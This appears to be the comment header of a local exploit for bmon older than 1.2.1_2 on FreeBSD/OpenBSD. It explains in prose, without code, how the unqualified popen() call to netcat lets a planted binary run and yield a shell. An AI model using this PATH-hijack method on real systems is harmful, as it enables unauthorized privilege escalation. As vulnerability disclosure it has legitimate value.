# local exploit for FreeBSD/OpenBSD with bmon < 1.2.1_2 installed.
# when bmon is executed with the -n parameter it popen()s netcat
# but fail to provide an absoluth path.
# some bsds are configured with acls that doesnt allow setuid files to
# run except those that are explicity allowed, so creating a file called
# netcat that chmod's +s bash wouldnt work, bash needs to run directly by
# bmon which uses ncurses, so to get a useable shell we need to redirect
# stdout to stderr (stdout is closed), and restore the stty settings.
